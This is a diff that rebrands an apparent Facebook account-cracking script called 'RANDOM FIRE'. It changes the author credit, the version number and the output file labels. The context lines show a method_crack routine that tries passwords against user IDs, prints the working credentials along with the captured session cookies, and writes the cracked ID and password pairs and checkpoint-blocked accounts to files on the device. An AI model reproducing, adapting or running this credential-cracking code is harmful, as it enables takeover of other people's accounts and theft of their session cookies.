@@ -80,11 +80,11 @@ logo=(f'''{B}\033[0;92m
       ║ 
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;45m      [ TOOLS CREATED BY : PRINCE RONI ]     \033[0;92m║
+║\33[0;45m      [ TOOLS CREATED BY : Md.Bayezid Bostami 🙂 ]     \033[0;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;42mTOOLS      :   RANDOM\033[0;92m          \33[0;41mFIRE\033[0;92m          ║
-║\33[0;41mVERSION    :   1.0.0 \033[0;92m                        ║
+║\33[0;41mVERSION    :   1.0.1 \033[0;92m                        ║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 
 --------------------------------------------{B}''')
@@ -170,15 +170,15 @@ def method_crack(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-                    print('\r\r \033[1;32m[DX-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m[IDFC-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;37m [COOKIE-😈] '+coki)
-                    open('/sdcard/DX-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    open('/sdcard/IDFC-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                     oks.append(str(uid))
                     break
             elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[DX-CP] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/DX-CP.txt','a').write(ids+'|'+pas+'\n')
+                print('\r\r \033[1;35m[IDFC-CP] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/IDFC-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
